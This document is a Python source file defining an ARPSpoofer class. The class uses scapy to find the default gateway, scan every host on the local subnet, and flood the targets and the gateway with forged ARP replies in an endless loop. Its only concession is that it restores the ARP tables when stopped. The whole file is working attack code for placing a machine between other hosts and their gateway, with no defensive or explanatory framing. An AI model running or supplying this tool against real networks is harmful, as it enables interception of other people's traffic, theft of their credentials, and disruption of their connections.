import ipaddress
import time

import netifaces
from scapy.all import ARP, Ether, send, srp


class ARPSpoofer:
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.gateway_ip = self.get_gateway_ip()
        self.gateway_mac = self.get_mac(self.gateway_ip)

    def get_gateway_ip(self):
        gateways = netifaces.gateways()
        default = gateways.get("default", {}).get(netifaces.AF_INET)
        if not default:
            raise RuntimeError("No default IPv4 gateway found. Check your network.")
        return default[0]

    def get_mac(self, ip):
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request

        answered = srp(
            arp_request_broadcast,
            timeout=2,
            verbose=False,
            iface=self.interface,
        )[0]
        if not answered:
            raise RuntimeError(f"Could not resolve MAC for gateway {ip} on {self.interface}")
        return answered[0][1].hwsrc

    def spoof(self, target_ip, target_mac):
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
        send(arp_response, iface=self.interface, verbose=False)

        arp_response_gw = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip)
        send(arp_response_gw, iface=self.interface, verbose=False)

    def restore(self, target_ip, target_mac):
        arp_response = ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.gateway_mac,
        )
        send(arp_response, count=4, iface=self.interface, verbose=False)

        arp_response_gw = ARP(
            op=2,
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=target_ip,
            hwsrc=target_mac,
        )
        send(arp_response_gw, count=4, iface=self.interface, verbose=False)

    def _local_ipv4_network(self):
        try:
            addrs = netifaces.ifaddresses(self.interface)
        except ValueError:
            return None
        inet_list = addrs.get(netifaces.AF_INET) or []
        for addr in inet_list:
            ip = addr.get("addr")
            netmask = addr.get("netmask")
            if not ip or not netmask or ip.startswith("127."):
                continue
            try:
                return str(ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False))
            except ValueError:
                continue
        return None

    def get_network_hosts(self):
        cidr = self._local_ipv4_network() or "192.168.1.0/24"
        print(f"[+] Scanning LAN {cidr} on {self.interface}")

        arp_request = ARP(pdst=cidr)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request

        answered = srp(
            arp_request_broadcast,
            timeout=5,
            verbose=False,
            iface=self.interface,
        )[0]

        hosts = []
        for _sent, received in answered:
            hosts.append({"ip": received.psrc, "mac": received.hwsrc})

        return hosts

    def start_spoofing(self, targets):
        print(f"[+] Starting ARP spoofing on {len(targets)} targets")
        try:
            while True:
                for target in targets:
                    self.spoof(target["ip"], target["mac"])
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[!] Restoring ARP tables...")
            for target in targets:
                self.restore(target["ip"], target["mac"])
